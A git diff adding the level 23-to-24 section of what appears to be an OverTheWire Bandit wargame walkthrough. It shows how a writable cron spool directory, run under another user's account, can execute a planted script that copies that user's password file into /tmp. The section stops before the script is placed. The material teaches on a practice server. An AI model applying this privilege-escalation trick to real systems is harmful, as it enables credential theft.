@@ -725,13 +725,72 @@ bandit22@bandit:~$
 
 ## Level 23 → Level 24
 
-
+In this level we are going to write a small script ot get the next password.  
+First of all let's take a look at the cronjob.
 
 ```
+bandit23@bandit:~$ ls -al /etc/cron.d
+total 36
+drwxr-xr-x  2 root root 4096 Jul 11 15:56 .
+drwxr-xr-x 87 root root 4096 May 14 09:41 ..
+-rw-r--r--  1 root root   62 May 14 13:40 cronjob_bandit15_root
+-rw-r--r--  1 root root   62 Jul 11 15:56 cronjob_bandit17_root
+-rw-r--r--  1 root root  120 May  7 20:14 cronjob_bandit22
+-rw-r--r--  1 root root  122 May  7 20:14 cronjob_bandit23
+-rw-r--r--  1 root root  120 May 14 09:41 cronjob_bandit24
+-rw-r--r--  1 root root   62 May 14 14:04 cronjob_bandit25_root
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
 
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+bandit23@bandit:~$
 ```
 
-## Level 23 → Level 24
+The dir `/var/spool/bandit24/` has `+w` `+x`, we need to copy out script inside that
+folder and make the cronjob execute that for us with `bandit24` privilegies.  
+But first, we need to make a new directory to write our script.
+
+```
+bandit23@bandit:~$ mkdir /tmp/bandit23
+bandit23@bandit:~$ cd /tmp/bandit23
+bandit23@bandit:/tmp/bandit23$ touch reveal.sh
+bandit23@bandit:/tmp/bandit23$ chmod +x reveal.sh
+bandit23@bandit:/tmp/bandit23$ vim reveal.sh
+```
+
+Simple script that reads the password from `bandit24` and and echo inside a dir into `/tmp/bandit24`.
+
+```
+#!/bin/bash
+
+mkdir /tmp/bandit24
+
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24/pass
+```
+
+
+
+## Level 24 → Level 25
 ## Level 25 → Level 26
 ## Level 26 → Level 27
 ## Level 27 → Level 28
